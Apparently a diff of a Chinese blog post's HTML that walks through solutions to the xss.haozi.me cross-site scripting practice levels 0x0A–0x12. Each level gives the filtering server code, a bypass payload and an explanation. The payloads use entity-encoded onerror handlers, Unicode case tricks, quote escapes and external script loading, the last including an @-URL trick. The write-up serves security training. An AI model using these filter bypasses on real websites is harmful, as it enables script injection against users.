+<h4 id="input-code-9"><a href="#input-code-9" class="headerlink" title="input code"></a>input code</h4><pre><code class="language-js">https://www.segmentfault.com.wmcoder.site/j.js
+</code></pre>
+<h4 id="解释-9"><a href="#解释-9" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>对很多符号进行了转义，例如&amp; ‘ “ &lt; &gt; &#x2F;  都转义成了html实体编码，html实体编码在html标签的属性中可以直接进行解析。并且匹配了以<a href="https://www.segmentfault.com开头的url.当我们访问/" target="_blank" rel="noopener">https://www.segmentfault.com开头的url。当我们访问</a> <a href="https://www.baidu.com@www.sina.com/" target="_blank" rel="noopener">https://www.baidu.com@www.sina.com</a> 的时候我们实际访问的是 <a href="https://www.sina,com./" target="_blank" rel="noopener">https://www.sina,com。</a> 所以这里我们可以用指定的url开头，但是用@符号来执行自己的js，在这个js中有弹窗的代码。</p>
+</blockquote>
+<h4 id="运行结果-7"><a href="#运行结果-7" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><h4 id="server-code-11"><a href="#server-code-11" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (input) &amp;#123;
+  input = input.toUpperCase()
+  return `&lt;h1&gt;$&amp;#123;input&amp;#125;&lt;/h1&gt;`
+&amp;#125;
+</code></pre>
+<h4 id="input-code-10"><a href="#input-code-10" class="headerlink" title="input code"></a>input code</h4><pre><code class="language-js">&lt;img src=&quot;x&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;
+</code></pre>
+<h4 id="解释-10"><a href="#解释-10" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>输入的内容全部变成大写。在html标签和url中不区分大小写，但是js严格区分大小写。</p>
+<p>所以我们可以在标签的属性内用<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a> 这里面的脚本来进行弹窗，或者是用alert(1)的时候进行编码，可以转成html编码。</p>
+</blockquote>
+<h4 id="运行结果-8"><a href="#运行结果-8" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><h4 id="server-code-12"><a href="#server-code-12" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (input) &amp;#123;
+  input = input.replace(/script/ig, &#39;&#39;)
+  input = input.toUpperCase()
+  return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;
+&amp;#125;
+</code></pre>
+<h4 id="input-code-11"><a href="#input-code-11" class="headerlink" title="input code"></a>input code</h4><pre><code class="language-js">&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;
+</code></pre>
+<h4 id="解释-11"><a href="#解释-11" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>把script替换成空，输入全部大写。</p>
+<p>这里我们可以不用script标签</p>
+</blockquote>
+<h4 id="运行结果-9"><a href="#运行结果-9" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><h4 id="server-code-13"><a href="#server-code-13" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (input) &amp;#123;
+  input = input.replace(/[&lt;/&quot;&#39;]/g, &#39;&#39;)
+  return `
+    &lt;script&gt;
+          // alert(&#39;$&amp;#123;input&amp;#125;&#39;)
+    &lt;/script&gt;
+  `
+&amp;#125;
+</code></pre>
+<h4 id="input-code-12"><a href="#input-code-12" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript">'<span class="token punctuation">)</span>
 <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-<span class="token operator">--</span><span class="token operator">></span></code></pre><h4 id="解释-12"><a href="#解释-12" class="headerlink" title="解释"></a>解释</h4><blockquote><p>将符号 &lt; / “ ‘ 替换成空，并且输入的内容是注释，这里可以用换行绕过。并且用html的注释符 –&gt; 注释掉后面的单引号和圆括号。</p></blockquote><h4 id="运行截图-12"><a href="#运行截图-12" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143958064.png" alt=""></h4><h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><h4 id="server-code-14"><a href="#server-code-14" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;([a-zA-Z])/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;_$1'</span><span class="token punctuation">)</span>
+<span class="token operator">--</span><span class="token operator">></span></code></pre>
+
+<h4 id="解释-12"><a href="#解释-12" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>将符号 &lt; &#x2F; “ ‘ 替换成空，并且输入的内容是注释，这里可以用换行绕过。并且用html的注释符 –&gt; 注释掉后面的单引号和圆括号。</p>
+</blockquote>
+<h4 id="运行结果-10"><a href="#运行结果-10" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><h4 id="server-code-14"><a href="#server-code-14" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;([a-zA-Z])</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&lt;_$1'</span><span class="token punctuation">)</span>
   input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;h1>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/h1>'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-13"><a href="#input-code-13" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>ſcript src<span class="token operator">=</span><span class="token string">"https://xss.haozi.me/j.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="解释-13"><a href="#解释-13" class="headerlink" title="解释"></a>解释</h4><blockquote><p>将 &lt; 开头的不管后面是什么字母都通通加上一个_ ，所以所有的标签都不能用。</p><p>字符ſ大写后为S。</p></blockquote><h4 id="运行截图-13"><a href="#运行截图-13" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716144008583.png" alt=""></h4><h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><h4 id="server-code-15"><a href="#server-code-15" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&amp;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\//g</span><span class="token punctuation">,</span> <span class="token string">'&amp;#x2f;'</span><span class="token punctuation">)</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;img src onerror="console.error('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">')">`</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-14"><a href="#input-code-14" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token string">');alert('</span><span class="token number">1</span></code></pre><h4 id="解释-14"><a href="#解释-14" class="headerlink" title="解释"></a>解释</h4><blockquote><p>对字符 &amp; ‘ “ &lt; &gt; / 进行html编码，输入的内容在img标签中，所以编码没有影响。内容在console.error中，我们可以闭合console.error，并且在onerror属性中添加一个alert。</p></blockquote><h4 id="运行截图-14"><a href="#运行截图-14" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716144017963.png" alt=""></h4><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><h4 id="server-code-16"><a href="#server-code-16" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code-13"><a href="#input-code-13" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>ſcript src<span class="token operator">=</span><span class="token string">"https://xss.haozi.me/j.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+
+<h4 id="解释-13"><a href="#解释-13" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>将 &lt; 开头的不管后面是什么字母都通通加上一个_ ，所以所有的标签都不能用。</p>
+<p>字符ſ大写后为S。</p>
+</blockquote>
+<h4 id="运行结果-11"><a href="#运行结果-11" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><h4 id="server-code-15"><a href="#server-code-15" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">'</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;#39;'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">"</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\/</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;#x2f;'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;img src onerror="console.error('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">')"></span><span class="token template-punctuation string">`</span></span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code-14"><a href="#input-code-14" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">');alert('</span><span class="token number">1</span></code></pre>
+
+<h4 id="解释-14"><a href="#解释-14" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>对字符 &amp; ‘ “ &lt; &gt; &#x2F; 进行html编码，输入的内容在img标签中，所以编码没有影响。内容在console.error中，我们可以闭合console.error，并且在onerror属性中添加一个alert。</p>
+</blockquote>
+<h4 id="运行结果-12"><a href="#运行结果-12" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><h4 id="server-code-16"><a href="#server-code-16" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
 &lt;script>
-  window.data = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>input<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">
+  window.data = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>input<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
 &lt;/script>
-  `</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-15"><a href="#input-code-15" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token string">''</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><h4 id="解释-15"><a href="#解释-15" class="headerlink" title="解释"></a>解释</h4><blockquote><p>没有过滤，在script标签中直接执行。</p></blockquote><h4 id="运行截图-15"><a href="#运行截图-15" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716144028236.png" alt=""></h4><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><h4 id="server-code-17"><a href="#server-code-17" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token comment" spellcheck="true">// from alf.nu</span>
-<span class="token keyword">function</span> render <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">function</span> escapeJs <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  </span><span class="token template-punctuation string">`</span></span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code-15"><a href="#input-code-15" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">''</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>
+
+<h4 id="解释-15"><a href="#解释-15" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>没有过滤，在script标签中直接执行。</p>
+</blockquote>
+<h4 id="运行结果-13"><a href="#运行结果-13" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><h4 id="server-code-17"><a href="#server-code-17" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from alf.nu</span>
+<span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">function</span> <span class="token function">escapeJs</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">return</span> <span class="token function">String</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\\/g</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span>\\\<span class="token string">''</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token template-string"><span class="token string">`/g, '\\`</span></span>'<span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">'\\74'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span> <span class="token string">'\\76'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\//g</span><span class="token punctuation">,</span> <span class="token string">'\\/'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\n/g</span><span class="token punctuation">,</span> <span class="token string">'\\n'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\r/g</span><span class="token punctuation">,</span> <span class="token string">'\\r'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\t/g</span><span class="token punctuation">,</span> <span class="token string">'\\t'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\f/g</span><span class="token punctuation">,</span> <span class="token string">'\\f'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\v/g</span><span class="token punctuation">,</span> <span class="token string">'\\v'</span><span class="token punctuation">)</span>
-            <span class="token comment" spellcheck="true">// .replace(/\b/g, '\\b')</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\0/g</span><span class="token punctuation">,</span> <span class="token string">'\\0'</span><span class="token punctuation">)</span>
-  <span class="token punctuation">}</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">'</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\\''</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">"</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\"'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">`</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\`'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\74'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\76'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\/</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\/'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\n'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\r</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\r'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\t</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\t'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\f</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\f'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\v</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\v'</span><span class="token punctuation">)</span>
+            <span class="token comment">// .replace(/\b/g, '\\b')</span>
+            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\0</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\0'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
   s <span class="token operator">=</span> <span class="token function">escapeJs</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`
+  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
 &lt;script>
-  var url = 'javascript:console.log("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>s<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">")'
+  var url = 'javascript:console.log("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>s<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")'
   var a = document.createElement('a')
   a.href = url
   document.body.appendChild(a)
   a.click()
 &lt;/script>
-`</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-16"><a href="#input-code-16" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token string">"),alert("</span><span class="token number">1</span></code></pre><h4 id="解释-16"><a href="#解释-16" class="headerlink" title="解释"></a>解释</h4><blockquote><p>过滤了很多的字符。并且将” 替换成 &quot; ，但是并没有什么卵用，\正好可以当做是双引号里面的内容。输入的内容在javascript:console.log里面，我们将这个闭合以后添加一个alert然后把后面的注释掉。</p></blockquote><h4 id="运行截图-16"><a href="#运行截图-16" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716144042289.png" alt=""></h4><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><h4 id="server-code-18"><a href="#server-code-18" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token comment" spellcheck="true">// from alf.nu</span>
-<span class="token keyword">function</span> escape <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-17"><a href="#input-code-17" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js">\"<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span></code></pre><h4 id="解释-17"><a href="#解释-17" class="headerlink" title="解释"></a>解释</h4><blockquote><p>将 “ 替换成 &quot; ，输入的内容在console.log里面，在html标签外面，所以不能进行html编码。</p><p>这里可以直接闭合掉script标签，重新添加一个</p><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>也可以将替换的 &quot; 的 \在前面再添加一个\转义掉。</p><pre class="language-js"><code class="language-js">\"<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span></code></pre></blockquote><h4 id="运行截图-17"><a href="#运行截图-17" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716144050975.png" alt=""></h4></div><hr><div class="reprint" id="reprint-statement"><div class="reprint__author"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-user">文章作者: </i></span><span class="reprint-info"><a href="https://wmlunar.github.io" rel="external nofollow noreferrer">未名</a></span></div><div class="reprint__type"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-link">文章链接: </i></span><span class="reprint-info"><a href="https://wmlunar.github.io/posts/6057.html">https://wmlunar.github.io/posts/6057.html</a></span></div><div class="reprint__notice"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-copyright">版权声明: </i></span><span class="reprint-info">本博客所有文章除特別声明外，均采用 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a> 许可协议。转载请注明来源 <a href="https://wmlunar.github.io" target="_blank">未名</a> !</span></div></div><script async defer>document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
